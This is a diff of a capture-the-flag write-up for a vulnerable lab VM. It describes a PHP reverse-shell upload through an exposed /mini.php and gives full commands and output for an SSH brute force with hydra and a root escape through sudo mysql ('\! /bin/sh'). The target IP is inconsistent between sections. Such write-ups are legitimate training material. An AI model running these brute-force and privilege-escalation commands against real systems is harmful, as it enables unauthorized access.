@@ -1,4 +1,5 @@
 NMAP SCANS
+===================
 The full port scan only reveals the two ports.
 
 # nmap -sC -sV 192.168.59.132
@@ -15,12 +16,14 @@ MAC Address: 00:50:56:BF:B3:33 (VMware)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 DIRECTORY SCAN
+===================
 /phpmyadmin
 /javascript
 /mini.php
 /robots.txt
 
 Reverse Shell - Upload
+===================
 The /mini.php has a functionality to upload a reverse shell. It is strange that we even find the functionality to change file permission there.
 So I proceed as follows:
 - Prepare a php reverse shell script
@@ -29,4 +32,32 @@ So I proceed as follows:
 - Setup netcat reverse call listener
 - Visit the site /evilscript.php
 - Get a callback on attacking machine
+
+That's all the user flag acheived.
+
+Privilege Escalation
+===================
+Visit the /home and list the users.
+Ssh bruteforce these users to see if any success.
+# hydra -l goat -P rockyou.txt ssh://192.168.53.132
+
+[DATA] attacking ssh://192.168.53.132:22/
+[22][ssh] host: 192.168.53.132   login: goat   password: goat
+
+SSH in as goat.
+Look for privilege escalation vectors.
+
+goat@funbox7:~$ sudo -l
+Matching Defaults entries for goat on funbox7:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User goat may run the following commands on funbox7:
+    (root) NOPASSWD: /usr/bin/mysql
+goat@funbox7:~$ ls
+goat@funbox7:~$ sudo /usr/bin/mysql -e '\! /bin/sh'
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+Visit GTFOBins and check how to become sudo. That's it, the box is rooted.
 
